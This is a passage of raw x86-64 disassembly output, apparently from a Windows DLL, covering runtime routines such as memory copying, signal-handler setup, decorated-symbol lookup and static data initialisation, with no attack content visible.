    6d8c4881:	48 89 c2             	mov    %rax,%rdx
    6d8c4884:	e8 86 ff ff ff       	call   0x6d8c480f
    6d8c4889:	48 8b 7e 18          	mov    0x18(%rsi),%rdi
    6d8c488d:	4c 8b 0b             	mov    (%rbx),%r9
    6d8c4890:	48 89 c1             	mov    %rax,%rcx
    6d8c4893:	49 89 c2             	mov    %rax,%r10
    6d8c4896:	48 8b 77 08          	mov    0x8(%rdi),%rsi
    6d8c489a:	4c 89 08             	mov    %r9,(%rax)
    6d8c489d:	48 89 f2             	mov    %rsi,%rdx
    6d8c48a0:	e8 96 f6 ff ff       	call   0x6d8c3f3b
    6d8c48a5:	48 89 d9             	mov    %rbx,%rcx
    6d8c48a8:	48 89 f2             	mov    %rsi,%rdx
    6d8c48ab:	49 89 c3             	mov    %rax,%r11
    6d8c48ae:	e8 88 f6 ff ff       	call   0x6d8c3f3b
    6d8c48b3:	48 8b 0f             	mov    (%rdi),%rcx
    6d8c48b6:	48 89 c6             	mov    %rax,%rsi
    6d8c48b9:	4c 89 df             	mov    %r11,%rdi
    6d8c48bc:	49 0f af c9          	imul   %r9,%rcx
    6d8c48c0:	f3 a4                	rep movsb (%rsi),(%rdi)
    6d8c48c2:	48 c7 03 00 00 00 00 	movq   $0x0,(%rbx)
    6d8c48c9:	4c 89 d3             	mov    %r10,%rbx
    6d8c48cc:	eb 17                	jmp    0x6d8c48e5
    6d8c48ce:	ba 01 00 00 00       	mov    $0x1,%edx
    6d8c48d3:	48 89 f1             	mov    %rsi,%rcx
    6d8c48d6:	e8 34 ff ff ff       	call   0x6d8c480f
    6d8c48db:	48 89 c3             	mov    %rax,%rbx
    6d8c48de:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
    6d8c48e5:	48 89 d8             	mov    %rbx,%rax
    6d8c48e8:	48 83 c4 20          	add    $0x20,%rsp
    6d8c48ec:	5b                   	pop    %rbx
    6d8c48ed:	5e                   	pop    %rsi
    6d8c48ee:	5f                   	pop    %rdi
    6d8c48ef:	c3                   	ret
    6d8c48f0:	56                   	push   %rsi
    6d8c48f1:	53                   	push   %rbx
    6d8c48f2:	48 83 ec 38          	sub    $0x38,%rsp
    6d8c48f6:	48 8b 0d 23 2d 10 00 	mov    0x102d23(%rip),%rcx        # 0x6d9c7620
    6d8c48fd:	48 85 c9             	test   %rcx,%rcx
    6d8c4900:	74 0b                	je     0x6d8c490d
    6d8c4902:	48 83 c4 38          	add    $0x38,%rsp
    6d8c4906:	5b                   	pop    %rbx
    6d8c4907:	5e                   	pop    %rsi
    6d8c4908:	e9 60 fd ff ff       	jmp    0x6d8c466d
    6d8c490d:	48 8d 0d 2c 2d 10 00 	lea    0x102d2c(%rip),%rcx        # 0x6d9c7640
    6d8c4914:	ba 30 00 00 00       	mov    $0x30,%edx
    6d8c4919:	e8 37 f5 ff ff       	call   0x6d8c3e55
    6d8c491e:	48 8d 0d 9b da 00 00 	lea    0xda9b(%rip),%rcx        # 0x6d8d23c0
    6d8c4925:	48 89 c3             	mov    %rax,%rbx
    6d8c4928:	48 8b 73 18          	mov    0x18(%rbx),%rsi
    6d8c492c:	48 8d 05 cd 2e 10 00 	lea    0x102ecd(%rip),%rax        # 0x6d9c7800
    6d8c4933:	48 89 03             	mov    %rax,(%rbx)
    6d8c4936:	48 8d 05 d3 d8 00 00 	lea    0xd8d3(%rip),%rax        # 0x6d8d2210
    6d8c493d:	48 89 43 10          	mov    %rax,0x10(%rbx)
    6d8c4941:	e8 8a f5 ff ff       	call   0x6d8c3ed0
    6d8c4946:	48 85 f6             	test   %rsi,%rsi
    6d8c4949:	48 89 43 18          	mov    %rax,0x18(%rbx)
    6d8c494d:	74 09                	je     0x6d8c4958
    6d8c494f:	48 8d 4e f0          	lea    -0x10(%rsi),%rcx
    6d8c4953:	e8 27 e4 ff ff       	call   0x6d8c2d7f
    6d8c4958:	48 c7 44 24 20 35 00 	movq   $0x35,0x20(%rsp)
    6d8c495f:	00 00 
    6d8c4961:	4c 8d 0d 95 d8 00 00 	lea    0xd895(%rip),%r9        # 0x6d8d21fd
    6d8c4968:	48 89 d9             	mov    %rbx,%rcx
    6d8c496b:	4c 8d 05 95 d8 00 00 	lea    0xd895(%rip),%r8        # 0x6d8d2207
    6d8c4972:	48 8d 15 97 d8 00 00 	lea    0xd897(%rip),%rdx        # 0x6d8d2210
    6d8c4979:	e8 79 fd ff ff       	call   0x6d8c46f7
    6d8c497e:	90                   	nop
    6d8c497f:	57                   	push   %rdi
    6d8c4980:	48 83 ec 20          	sub    $0x20,%rsp
    6d8c4984:	4c 8d 05 c3 d8 00 00 	lea    0xd8c3(%rip),%r8        # 0x6d8d224e
    6d8c498b:	83 f9 02             	cmp    $0x2,%ecx
    6d8c498e:	74 39                	je     0x6d8c49c9
    6d8c4990:	4c 8d 05 d7 d8 00 00 	lea    0xd8d7(%rip),%r8        # 0x6d8d226e
    6d8c4997:	83 f9 0b             	cmp    $0xb,%ecx
    6d8c499a:	74 2d                	je     0x6d8c49c9
    6d8c499c:	4c 8d 05 7b d8 00 00 	lea    0xd87b(%rip),%r8        # 0x6d8d221e
    6d8c49a3:	83 f9 16             	cmp    $0x16,%ecx
    6d8c49a6:	74 21                	je     0x6d8c49c9
    6d8c49a8:	4c 8d 05 fd d8 00 00 	lea    0xd8fd(%rip),%r8        # 0x6d8d22ac
    6d8c49af:	83 f9 08             	cmp    $0x8,%ecx
    6d8c49b2:	74 15                	je     0x6d8c49c9
    6d8c49b4:	4c 8d 05 83 d8 00 00 	lea    0xd883(%rip),%r8        # 0x6d8d223e
    6d8c49bb:	83 f9 04             	cmp    $0x4,%ecx
    6d8c49be:	48 8d 05 02 d9 00 00 	lea    0xd902(%rip),%rax        # 0x6d8d22c7
    6d8c49c5:	4c 0f 44 c0          	cmove  %rax,%r8
    6d8c49c9:	31 c0                	xor    %eax,%eax
    6d8c49cb:	4c 89 c7             	mov    %r8,%rdi
    6d8c49ce:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
    6d8c49d2:	f2 ae                	repnz scas (%rdi),%al
    6d8c49d4:	48 89 ca             	mov    %rcx,%rdx
    6d8c49d7:	4c 89 c1             	mov    %r8,%rcx
    6d8c49da:	48 f7 d2             	not    %rdx
    6d8c49dd:	48 8d 52 ff          	lea    -0x1(%rdx),%rdx
    6d8c49e1:	e8 e3 f9 ff ff       	call   0x6d8c43c9
    6d8c49e6:	b9 01 00 00 00       	mov    $0x1,%ecx
    6d8c49eb:	e8 98 9b 00 00       	call   0x6d8ce588
    6d8c49f0:	90                   	nop
    6d8c49f1:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c49f5:	48 8d 15 83 ff ff ff 	lea    -0x7d(%rip),%rdx        # 0x6d8c497f
    6d8c49fc:	b9 02 00 00 00       	mov    $0x2,%ecx
    6d8c4a01:	e8 3a 9b 00 00       	call   0x6d8ce540
    6d8c4a06:	48 8d 15 72 ff ff ff 	lea    -0x8e(%rip),%rdx        # 0x6d8c497f
    6d8c4a0d:	b9 0b 00 00 00       	mov    $0xb,%ecx
    6d8c4a12:	e8 29 9b 00 00       	call   0x6d8ce540
    6d8c4a17:	48 8d 15 61 ff ff ff 	lea    -0x9f(%rip),%rdx        # 0x6d8c497f
    6d8c4a1e:	b9 16 00 00 00       	mov    $0x16,%ecx
    6d8c4a23:	e8 18 9b 00 00       	call   0x6d8ce540
    6d8c4a28:	48 8d 15 50 ff ff ff 	lea    -0xb0(%rip),%rdx        # 0x6d8c497f
    6d8c4a2f:	b9 08 00 00 00       	mov    $0x8,%ecx
    6d8c4a34:	e8 07 9b 00 00       	call   0x6d8ce540
    6d8c4a39:	48 8d 15 3f ff ff ff 	lea    -0xc1(%rip),%rdx        # 0x6d8c497f
    6d8c4a40:	b9 04 00 00 00       	mov    $0x4,%ecx
    6d8c4a45:	48 83 c4 28          	add    $0x28,%rsp
    6d8c4a49:	e9 f2 9a 00 00       	jmp    0x6d8ce540
    6d8c4a4e:	48 8b 41 f0          	mov    -0x10(%rcx),%rax
    6d8c4a52:	48 c1 f8 03          	sar    $0x3,%rax
    6d8c4a56:	c3                   	ret
    6d8c4a57:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c4a5b:	e8 90 d1 ff ff       	call   0x6d8c1bf0
    6d8c4a60:	48 89 c1             	mov    %rax,%rcx
    6d8c4a63:	48 83 c4 28          	add    $0x28,%rsp
    6d8c4a67:	48 ff 25 d6 c7 10 00 	rex.W jmp *0x10c7d6(%rip)        # 0x6d9d1244
    6d8c4a6e:	56                   	push   %rsi
    6d8c4a6f:	53                   	push   %rbx
    6d8c4a70:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c4a74:	48 8b 1d b5 c5 00 00 	mov    0xc5b5(%rip),%rbx        # 0x6d8d1030
    6d8c4a7b:	48 89 ce             	mov    %rcx,%rsi
    6d8c4a7e:	b9 02 00 00 00       	mov    $0x2,%ecx
    6d8c4a83:	ff d3                	call   *%rbx
    6d8c4a85:	48 8d 15 57 d8 00 00 	lea    0xd857(%rip),%rdx        # 0x6d8d22e3
    6d8c4a8c:	48 89 c1             	mov    %rax,%rcx
    6d8c4a8f:	e8 73 d1 ff ff       	call   0x6d8c1c07
    6d8c4a94:	48 89 f1             	mov    %rsi,%rcx
    6d8c4a97:	e8 54 d1 ff ff       	call   0x6d8c1bf0
    6d8c4a9c:	b9 02 00 00 00       	mov    $0x2,%ecx
    6d8c4aa1:	48 89 c6             	mov    %rax,%rsi
    6d8c4aa4:	ff d3                	call   *%rbx
    6d8c4aa6:	48 89 f2             	mov    %rsi,%rdx
    6d8c4aa9:	48 89 c1             	mov    %rax,%rcx
    6d8c4aac:	e8 56 d1 ff ff       	call   0x6d8c1c07
    6d8c4ab1:	ff 15 5d c7 10 00    	call   *0x10c75d(%rip)        # 0x6d9d1214
    6d8c4ab7:	3d c1 00 00 00       	cmp    $0xc1,%eax
    6d8c4abc:	75 16                	jne    0x6d8c4ad4
    6d8c4abe:	b9 02 00 00 00       	mov    $0x2,%ecx
    6d8c4ac3:	ff d3                	call   *%rbx
    6d8c4ac5:	48 8d 15 28 d8 00 00 	lea    0xd828(%rip),%rdx        # 0x6d8d22f4
    6d8c4acc:	48 89 c1             	mov    %rax,%rcx
    6d8c4acf:	e8 33 d1 ff ff       	call   0x6d8c1c07
    6d8c4ad4:	b9 02 00 00 00       	mov    $0x2,%ecx
    6d8c4ad9:	ff d3                	call   *%rbx
    6d8c4adb:	48 8d 15 43 d8 00 00 	lea    0xd843(%rip),%rdx        # 0x6d8d2325
    6d8c4ae2:	48 89 c1             	mov    %rax,%rcx
    6d8c4ae5:	e8 1d d1 ff ff       	call   0x6d8c1c07
    6d8c4aea:	b9 01 00 00 00       	mov    $0x1,%ecx
    6d8c4aef:	e8 94 9a 00 00       	call   0x6d8ce588
    6d8c4af4:	90                   	nop
    6d8c4af5:	56                   	push   %rsi
    6d8c4af6:	53                   	push   %rbx
    6d8c4af7:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c4afb:	48 8b 1d 2e c5 00 00 	mov    0xc52e(%rip),%rbx        # 0x6d8d1030
    6d8c4b02:	48 89 ce             	mov    %rcx,%rsi
    6d8c4b05:	b9 02 00 00 00       	mov    $0x2,%ecx
    6d8c4b0a:	ff d3                	call   *%rbx
    6d8c4b0c:	48 8d 15 14 d8 00 00 	lea    0xd814(%rip),%rdx        # 0x6d8d2327
    6d8c4b13:	48 89 c1             	mov    %rax,%rcx
    6d8c4b16:	e8 ec d0 ff ff       	call   0x6d8c1c07
    6d8c4b1b:	b9 02 00 00 00       	mov    $0x2,%ecx
    6d8c4b20:	ff d3                	call   *%rbx
    6d8c4b22:	48 89 f2             	mov    %rsi,%rdx
    6d8c4b25:	48 89 c1             	mov    %rax,%rcx
    6d8c4b28:	e8 da d0 ff ff       	call   0x6d8c1c07
    6d8c4b2d:	b9 02 00 00 00       	mov    $0x2,%ecx
    6d8c4b32:	ff d3                	call   *%rbx
    6d8c4b34:	48 8d 15 ea d7 00 00 	lea    0xd7ea(%rip),%rdx        # 0x6d8d2325
    6d8c4b3b:	48 89 c1             	mov    %rax,%rcx
    6d8c4b3e:	e8 c4 d0 ff ff       	call   0x6d8c1c07
    6d8c4b43:	b9 01 00 00 00       	mov    $0x1,%ecx
    6d8c4b48:	e8 3b 9a 00 00       	call   0x6d8ce588
    6d8c4b4d:	90                   	nop
    6d8c4b4e:	41 56                	push   %r14
    6d8c4b50:	41 55                	push   %r13
    6d8c4b52:	41 54                	push   %r12
    6d8c4b54:	55                   	push   %rbp
    6d8c4b55:	57                   	push   %rdi
    6d8c4b56:	56                   	push   %rsi
    6d8c4b57:	53                   	push   %rbx
    6d8c4b58:	48 81 ec 20 01 00 00 	sub    $0x120,%rsp
    6d8c4b5f:	4c 8b 2d b6 c6 10 00 	mov    0x10c6b6(%rip),%r13        # 0x6d9d121c
    6d8c4b66:	49 89 cc             	mov    %rcx,%r12
    6d8c4b69:	48 89 d5             	mov    %rdx,%rbp
    6d8c4b6c:	41 ff d5             	call   *%r13
    6d8c4b6f:	48 85 c0             	test   %rax,%rax
    6d8c4b72:	0f 85 b2 00 00 00    	jne    0x6d8c4c2a
    6d8c4b78:	48 8d 7c 24 26       	lea    0x26(%rsp),%rdi
    6d8c4b7d:	ba fa 00 00 00       	mov    $0xfa,%edx
    6d8c4b82:	bb 01 00 00 00       	mov    $0x1,%ebx
    6d8c4b87:	48 89 f9             	mov    %rdi,%rcx
    6d8c4b8a:	e8 bf d0 ff ff       	call   0x6d8c1c4e
    6d8c4b8f:	c6 44 24 26 5f       	movb   $0x5f,0x26(%rsp)
    6d8c4b94:	8a 44 1d ff          	mov    -0x1(%rbp,%rbx,1),%al
    6d8c4b98:	84 c0                	test   %al,%al
    6d8c4b9a:	74 0f                	je     0x6d8c4bab
    6d8c4b9c:	88 04 1f             	mov    %al,(%rdi,%rbx,1)
    6d8c4b9f:	48 ff c3             	inc    %rbx
    6d8c4ba2:	48 81 fb f5 00 00 00 	cmp    $0xf5,%rbx
    6d8c4ba9:	75 e9                	jne    0x6d8c4b94
    6d8c4bab:	c6 44 1c 26 40       	movb   $0x40,0x26(%rsp,%rbx,1)
    6d8c4bb0:	be 63 00 00 00       	mov    $0x63,%esi
    6d8c4bb5:	41 be 0a 00 00 00    	mov    $0xa,%r14d
    6d8c4bbb:	48 8d 4e 9d          	lea    -0x63(%rsi),%rcx
    6d8c4bbf:	48 81 fe c6 00 00 00 	cmp    $0xc6,%rsi
    6d8c4bc6:	76 06                	jbe    0x6d8c4bce
    6d8c4bc8:	48 83 c3 03          	add    $0x3,%rbx
    6d8c4bcc:	eb 13                	jmp    0x6d8c4be1
    6d8c4bce:	48 8d 46 a6          	lea    -0x5a(%rsi),%rax
    6d8c4bd2:	48 83 f8 12          	cmp    $0x12,%rax
    6d8c4bd6:	76 06                	jbe    0x6d8c4bde
    6d8c4bd8:	48 83 c3 02          	add    $0x2,%rbx
    6d8c4bdc:	eb 03                	jmp    0x6d8c4be1
    6d8c4bde:	48 ff c3             	inc    %rbx
    6d8c4be1:	c6 44 1c 27 00       	movb   $0x0,0x27(%rsp,%rbx,1)
    6d8c4be6:	48 89 c8             	mov    %rcx,%rax
    6d8c4be9:	31 d2                	xor    %edx,%edx
    6d8c4beb:	49 f7 f6             	div    %r14
    6d8c4bee:	48 89 c8             	mov    %rcx,%rax
    6d8c4bf1:	83 c2 30             	add    $0x30,%edx
    6d8c4bf4:	88 14 1f             	mov    %dl,(%rdi,%rbx,1)
    6d8c4bf7:	48 99                	cqto
    6d8c4bf9:	48 ff cb             	dec    %rbx
    6d8c4bfc:	49 f7 fe             	idiv   %r14
    6d8c4bff:	48 85 c0             	test   %rax,%rax
    6d8c4c02:	48 89 c1             	mov    %rax,%rcx
    6d8c4c05:	75 df                	jne    0x6d8c4be6
    6d8c4c07:	48 89 fa             	mov    %rdi,%rdx
    6d8c4c0a:	4c 89 e1             	mov    %r12,%rcx
    6d8c4c0d:	41 ff d5             	call   *%r13
    6d8c4c10:	48 85 c0             	test   %rax,%rax
    6d8c4c13:	75 15                	jne    0x6d8c4c2a
    6d8c4c15:	48 83 c6 04          	add    $0x4,%rsi
    6d8c4c19:	48 81 fe 2f 01 00 00 	cmp    $0x12f,%rsi
    6d8c4c20:	75 99                	jne    0x6d8c4bbb
    6d8c4c22:	48 89 e9             	mov    %rbp,%rcx
    6d8c4c25:	e8 cb fe ff ff       	call   0x6d8c4af5
    6d8c4c2a:	48 81 c4 20 01 00 00 	add    $0x120,%rsp
    6d8c4c31:	5b                   	pop    %rbx
    6d8c4c32:	5e                   	pop    %rsi
    6d8c4c33:	5f                   	pop    %rdi
    6d8c4c34:	5d                   	pop    %rbp
    6d8c4c35:	41 5c                	pop    %r12
    6d8c4c37:	41 5d                	pop    %r13
    6d8c4c39:	41 5e                	pop    %r14
    6d8c4c3b:	c3                   	ret
    6d8c4c3c:	57                   	push   %rdi
    6d8c4c3d:	56                   	push   %rsi
    6d8c4c3e:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c4c42:	48 85 c9             	test   %rcx,%rcx
    6d8c4c45:	48 89 ce             	mov    %rcx,%rsi
    6d8c4c48:	74 29                	je     0x6d8c4c73
    6d8c4c4a:	48 83 79 08 00       	cmpq   $0x0,0x8(%rcx)
    6d8c4c4f:	78 22                	js     0x6d8c4c73
    6d8c4c51:	48 8b 09             	mov    (%rcx),%rcx
    6d8c4c54:	48 83 c6 10          	add    $0x10,%rsi
    6d8c4c58:	e8 70 f1 ff ff       	call   0x6d8c3dcd
    6d8c4c5d:	48 8b 4e f0          	mov    -0x10(%rsi),%rcx
    6d8c4c61:	48 8d 50 10          	lea    0x10(%rax),%rdx
    6d8c4c65:	48 89 d7             	mov    %rdx,%rdi
    6d8c4c68:	48 89 08             	mov    %rcx,(%rax)
    6d8c4c6b:	48 ff c1             	inc    %rcx
    6d8c4c6e:	f3 a4                	rep movsb (%rsi),(%rdi)
    6d8c4c70:	48 89 c6             	mov    %rax,%rsi
    6d8c4c73:	48 89 f0             	mov    %rsi,%rax
    6d8c4c76:	48 83 c4 28          	add    $0x28,%rsp
    6d8c4c7a:	5e                   	pop    %rsi
    6d8c4c7b:	5f                   	pop    %rdi
    6d8c4c7c:	c3                   	ret
    6d8c4c7d:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c4c81:	48 8b 05 38 29 10 00 	mov    0x102938(%rip),%rax        # 0x6d9c75c0
    6d8c4c88:	48 3d ab 0d 00 00    	cmp    $0xdab,%rax
    6d8c4c8e:	7e 24                	jle    0x6d8c4cb4
    6d8c4c90:	b9 02 00 00 00       	mov    $0x2,%ecx
    6d8c4c95:	ff 15 95 c3 00 00    	call   *0xc395(%rip)        # 0x6d8d1030
    6d8c4c9b:	48 8d 15 98 d6 00 00 	lea    0xd698(%rip),%rdx        # 0x6d8d233a
    6d8c4ca2:	48 89 c1             	mov    %rax,%rcx
    6d8c4ca5:	e8 5d cf ff ff       	call   0x6d8c1c07
    6d8c4caa:	b9 01 00 00 00       	mov    $0x1,%ecx
    6d8c4caf:	e8 d4 98 00 00       	call   0x6d8ce588
    6d8c4cb4:	48 8d 15 85 2b 10 00 	lea    0x102b85(%rip),%rdx        # 0x6d9c7840
    6d8c4cbb:	48 89 0c c2          	mov    %rcx,(%rdx,%rax,8)
    6d8c4cbf:	48 ff c0             	inc    %rax
    6d8c4cc2:	48 89 05 f7 28 10 00 	mov    %rax,0x1028f7(%rip)        # 0x6d9c75c0
    6d8c4cc9:	48 83 c4 28          	add    $0x28,%rsp
    6d8c4ccd:	c3                   	ret
    6d8c4cce:	57                   	push   %rdi
    6d8c4ccf:	56                   	push   %rsi
    6d8c4cd0:	53                   	push   %rbx
    6d8c4cd1:	48 83 ec 20          	sub    $0x20,%rsp
    6d8c4cd5:	be 00 00 00 00       	mov    $0x0,%esi
    6d8c4cda:	48 85 d2             	test   %rdx,%rdx
    6d8c4cdd:	48 89 cf             	mov    %rcx,%rdi
    6d8c4ce0:	48 0f 49 f2          	cmovns %rdx,%rsi
    6d8c4ce4:	48 83 cb ff          	or     $0xffffffffffffffff,%rbx
    6d8c4ce8:	48 85 c9             	test   %rcx,%rcx
    6d8c4ceb:	74 06                	je     0x6d8c4cf3
    6d8c4ced:	48 8b 01             	mov    (%rcx),%rax
    6d8c4cf0:	48 01 c3             	add    %rax,%rbx
    6d8c4cf3:	4c 39 c3             	cmp    %r8,%rbx
    6d8c4cf6:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
    6d8c4cfd:	49 0f 4f d8          	cmovg  %r8,%rbx
    6d8c4d01:	48 29 f3             	sub    %rsi,%rbx
    6d8c4d04:	48 0f 48 d8          	cmovs  %rax,%rbx
    6d8c4d08:	48 01 fe             	add    %rdi,%rsi
    6d8c4d0b:	48 8d 4b 01          	lea    0x1(%rbx),%rcx
    6d8c4d0f:	e8 12 f4 ff ff       	call   0x6d8c4126
    6d8c4d14:	45 31 c0             	xor    %r8d,%r8d
    6d8c4d17:	4c 39 c3             	cmp    %r8,%rbx
    6d8c4d1a:	7c 0f                	jl     0x6d8c4d2b
    6d8c4d1c:	42 8a 54 06 10       	mov    0x10(%rsi,%r8,1),%dl
    6d8c4d21:	42 88 54 00 10       	mov    %dl,0x10(%rax,%r8,1)
    6d8c4d26:	49 ff c0             	inc    %r8
    6d8c4d29:	eb ec                	jmp    0x6d8c4d17
    6d8c4d2b:	48 83 c4 20          	add    $0x20,%rsp
    6d8c4d2f:	5b                   	pop    %rbx
    6d8c4d30:	5e                   	pop    %rsi
    6d8c4d31:	5f                   	pop    %rdi
    6d8c4d32:	c3                   	ret
    6d8c4d33:	48 83 ec 38          	sub    $0x38,%rsp
    6d8c4d37:	48 8d 0d f8 e5 ff ff 	lea    -0x1a08(%rip),%rcx        # 0x6d8c3336
    6d8c4d3e:	e8 bb e7 ff ff       	call   0x6d8c34fe
    6d8c4d43:	48 8d 44 24 28       	lea    0x28(%rsp),%rax
    6d8c4d48:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
    6d8c4d4d:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
    6d8c4d52:	e8 78 cf ff ff       	call   0x6d8c1ccf
    6d8c4d57:	e8 af d9 ff ff       	call   0x6d8c270b
    6d8c4d5c:	e8 90 fc ff ff       	call   0x6d8c49f1
    6d8c4d61:	90                   	nop
    6d8c4d62:	48 83 c4 38          	add    $0x38,%rsp
    6d8c4d66:	c3                   	ret
    6d8c4d67:	48 8d 05 12 73 0f 00 	lea    0xf7312(%rip),%rax        # 0x6d9bc080
    6d8c4d6e:	c6 05 0b 73 0f 00 02 	movb   $0x2,0xf730b(%rip)        # 0x6d9bc080
    6d8c4d75:	48 89 05 24 fa 0f 00 	mov    %rax,0xffa24(%rip)        # 0x6d9c47a0
    6d8c4d7c:	48 8d 05 fd f9 0f 00 	lea    0xff9fd(%rip),%rax        # 0x6d9c4780
    6d8c4d83:	48 89 05 8e 99 10 00 	mov    %rax,0x10998e(%rip)        # 0x6d9ce718
    6d8c4d8a:	48 8d 05 4f 73 0f 00 	lea    0xf734f(%rip),%rax        # 0x6d9bc0e0
    6d8c4d91:	48 89 05 a8 72 0f 00 	mov    %rax,0xf72a8(%rip)        # 0x6d9bc040
    6d8c4d98:	48 8d 05 db d5 00 00 	lea    0xd5db(%rip),%rax        # 0x6d8d237a
    6d8c4d9f:	48 89 05 52 73 0f 00 	mov    %rax,0xf7352(%rip)        # 0x6d9bc0f8
    6d8c4da6:	48 8d 05 63 73 0f 00 	lea    0xf7363(%rip),%rax        # 0x6d9bc110
    6d8c4dad:	48 8d 15 8c 26 10 00 	lea    0x10268c(%rip),%rdx        # 0x6d9c7440
    6d8c4db4:	48 89 05 8d 72 0f 00 	mov    %rax,0xf728d(%rip)        # 0x6d9bc048
    6d8c4dbb:	4c 8d 15 7e 73 0f 00 	lea    0xf737e(%rip),%r10        # 0x6d9bc140
    6d8c4dc2:	48 89 15 27 73 0f 00 	mov    %rdx,0xf7327(%rip)        # 0x6d9bc0f0
    6d8c4dc9:	48 8d 05 d0 8b 0f 00 	lea    0xf8bd0(%rip),%rax        # 0x6d9bd9a0
    6d8c4dd0:	4c 89 15 79 72 0f 00 	mov    %r10,0xf7279(%rip)        # 0x6d9bc050
    6d8c4dd7:	4c 8d 0d a3 d5 00 00 	lea    0xd5a3(%rip),%r9        # 0x6d8d2381
    6d8c4dde:	48 89 05 3b 73 0f 00 	mov    %rax,0xf733b(%rip)        # 0x6d9bc120
    6d8c4de5:	4c 8d 05 b4 97 10 00 	lea    0x1097b4(%rip),%r8        # 0x6d9ce5a0
    6d8c4dec:	4c 89 0d 35 73 0f 00 	mov    %r9,0xf7335(%rip)        # 0x6d9bc128
    6d8c4df3:	48 c7 05 9a f9 0f 00 	movq   $0x0,0xff99a(%rip)        # 0x6d9c4798
    6d8c4dfa:	00 00 00 00 
    6d8c4dfe:	4d 8d 4a 30          	lea    0x30(%r10),%r9
    6d8c4e02:	49 81 c2 90 00 00 00 	add    $0x90,%r10
    6d8c4e09:	66 c7 05 7e f9 0f 00 	movw   $0x111,0xff97e(%rip)        # 0x6d9c4790
    6d8c4e10:	11 01 
    6d8c4e12:	4c 8d 1d 6d d5 00 00 	lea    0xd56d(%rip),%r11        # 0x6d8d2386
    6d8c4e19:	48 c7 05 5c f9 0f 00 	movq   $0x8,0xff95c(%rip)        # 0x6d9c4780
    6d8c4e20:	08 00 00 00 
    6d8c4e24:	48 8d 0d d5 98 10 00 	lea    0x1098d5(%rip),%rcx        # 0x6d9ce700
    6d8c4e2b:	48 c7 05 52 f9 0f 00 	movq   $0x8,0xff952(%rip)        # 0x6d9c4788
    6d8c4e32:	08 00 00 00 
    6d8c4e36:	48 c7 05 5f 72 0f 00 	movq   $0x0,0xf725f(%rip)        # 0x6d9bc0a0
    6d8c4e3d:	00 00 00 00 
    6d8c4e41:	48 c7 05 b4 98 10 00 	movq   $0x30,0x1098b4(%rip)        # 0x6d9ce700
    6d8c4e48:	30 00 00 00 
    6d8c4e4c:	48 c7 05 b1 98 10 00 	movq   $0x8,0x1098b1(%rip)        # 0x6d9ce708
    6d8c4e53:	08 00 00 00 
    6d8c4e57:	c6 05 b2 98 10 00 11 	movb   $0x11,0x1098b2(%rip)        # 0x6d9ce710
    6d8c4e5e:	c6 05 7b 72 0f 00 01 	movb   $0x1,0xf727b(%rip)        # 0x6d9bc0e0
    6d8c4e65:	48 c7 05 78 72 0f 00 	movq   $0x8,0xf7278(%rip)        # 0x6d9bc0e8
    6d8c4e6c:	08 00 00 00 
    6d8c4e70:	48 c7 05 3d 8b 0f 00 	movq   $0x0,0xf8b3d(%rip)        # 0x6d9bd9b8
    6d8c4e77:	00 00 00 00 
    6d8c4e7b:	48 c7 05 1a 8b 0f 00 	movq   $0x8,0xf8b1a(%rip)        # 0x6d9bd9a0
    6d8c4e82:	08 00 00 00 
    6d8c4e86:	48 c7 05 17 8b 0f 00 	movq   $0x8,0xf8b17(%rip)        # 0x6d9bd9a8
    6d8c4e8d:	08 00 00 00 
    6d8c4e91:	66 c7 05 16 8b 0f 00 	movw   $0x31d,0xf8b16(%rip)        # 0x6d9bd9b0
    6d8c4e98:	1d 03 
    6d8c4e9a:	c6 05 6f 72 0f 00 01 	movb   $0x1,0xf726f(%rip)        # 0x6d9bc110
    6d8c4ea1:	48 c7 05 6c 72 0f 00 	movq   $0x10,0xf726c(%rip)        # 0x6d9bc118
    6d8c4ea8:	10 00 00 00 
    6d8c4eac:	48 c7 05 01 97 10 00 	movq   $0x0,0x109701(%rip)        # 0x6d9ce5b8
    6d8c4eb3:	00 00 00 00 
    6d8c4eb7:	48 c7 05 de 96 10 00 	movq   $0x8,0x1096de(%rip)        # 0x6d9ce5a0
    6d8c4ebe:	08 00 00 00 
    6d8c4ec2:	48 c7 05 db 96 10 00 	movq   $0x8,0x1096db(%rip)        # 0x6d9ce5a8
    6d8c4ec9:	08 00 00 00 
    6d8c4ecd:	66 c7 05 da 96 10 00 	movw   $0x21c,0x1096da(%rip)        # 0x6d9ce5b0
    6d8c4ed4:	1c 02 
    6d8c4ed6:	c6 05 63 72 0f 00 01 	movb   $0x1,0xf7263(%rip)        # 0x6d9bc140
    6d8c4edd:	48 c7 05 60 72 0f 00 	movq   $0x18,0xf7260(%rip)        # 0x6d9bc148
    6d8c4ee4:	18 00 00 00 
    6d8c4ee8:	4c 89 05 61 72 0f 00 	mov    %r8,0xf7261(%rip)        # 0x6d9bc150
    6d8c4eef:	4d 8d 81 90 00 00 00 	lea    0x90(%r9),%r8
    6d8c4ef6:	48 89 05 e3 72 0f 00 	mov    %rax,0xf72e3(%rip)        # 0x6d9bc1e0
    6d8c4efd:	48 89 05 3c 73 0f 00 	mov    %rax,0xf733c(%rip)        # 0x6d9bc240
    6d8c4f04:	48 8d 05 8d d4 00 00 	lea    0xd48d(%rip),%rax        # 0x6d8d2398
    6d8c4f0b:	4c 89 15 0e 71 0f 00 	mov    %r10,0xf710e(%rip)        # 0x6d9bc020
    6d8c4f12:	49 83 c2 60          	add    $0x60,%r10
    6d8c4f16:	48 89 05 2b 73 0f 00 	mov    %rax,0xf732b(%rip)        # 0x6d9bc248
    6d8c4f1d:	48 8d 05 fc 70 0f 00 	lea    0xf70fc(%rip),%rax        # 0x6d9bc020
    6d8c4f24:	48 89 05 9d 72 0f 00 	mov    %rax,0xf729d(%rip)        # 0x6d9bc1c8
    6d8c4f2b:	49 8d 82 70 ff ff ff 	lea    -0x90(%r10),%rax
    6d8c4f32:	4c 89 1d 1f 72 0f 00 	mov    %r11,0xf721f(%rip)        # 0x6d9bc158
